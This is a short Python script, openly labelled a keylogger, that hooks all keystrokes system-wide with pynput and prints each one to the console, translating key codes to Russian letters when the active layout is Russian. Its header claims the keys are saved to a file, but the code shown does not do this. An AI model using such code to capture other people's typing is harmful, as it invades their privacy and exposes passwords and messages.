'''ФАЙЛ КОСТИН, ПО СОЗДАНИЮ КЕЙЛОГЕРА и сохранения в файл'''
from pynput import keyboard
import ctypes

# издевательство, перевод с англ раскладки на РУ
dict_key = {
    81: 'й', 87: 'ц', 69: 'у', 82: 'к', 84: 'е', 89: 'н', 85: 'г', 73: 'ш', 79: 'щ', 80: 'з',
    65: 'ф', 83: 'ы', 68: 'в', 70: 'а', 71: 'п', 72: 'р', 74: 'о', 75: 'л', 76: 'д', 186: 'ж',
    90: 'я', 88: 'ч', 67: 'с', 86: 'м', 66: 'и', 78: 'т', 77: 'ь', 188: 'б', 190: 'ю', 191: '.',
    219: 'х', 221: 'ъ', 192: 'ё', 220: '\\', 222: 'э'
}


# словарь кодов ЯЗЫКОВ
dict_langs = {
    0x0409: "US",
    0x0419: "RU"
}


class LanguageQual:
    '''КЛАСС ПОЛУЧЕНИЯ ЯЗЫКА РАССКЛАДКИ'''
    def keyboardLayout(self):
        # хндл главного окна
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        # нить исполняемого данного окна ID
        nitya_id = ctypes.windll.user32.GetWindowThreadProcessId(hwnd, None)
        # хндл нити. Этот хендл представляет код раскладки клавиатуры для данной нити.
        hndl_nit = ctypes.windll.user32.GetKeyboardLayout(nitya_id)

        lang_id = hndl_nit & 0xFFFF
        return lang_id


class KeyboardPrint(LanguageQual):
    '''КЕЙЛОГЕР, КЛАСС СОЗДАНИЯ'''
    def on_press(self, key):
        lang_id = self.keyboardLayout()
        current_lang = dict_langs.get(lang_id, 'ERROR')

        try:
            if current_lang == 'US':
                print(f'Press - {key}')
            elif current_lang == 'RU':
                key_RU = dict_key.get(key.vk, 'No key')
                print(f'Нажата - {key_RU}, Ord Code = {key.vk}. KeyEN = {key}')
        except AttributeError:
            print(f'Press2 - {key}')

    def key_print(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()



k = KeyboardPrint()  # Создание экземпляра класса
print(k.key_print())  # Вызов метода у экземпляра




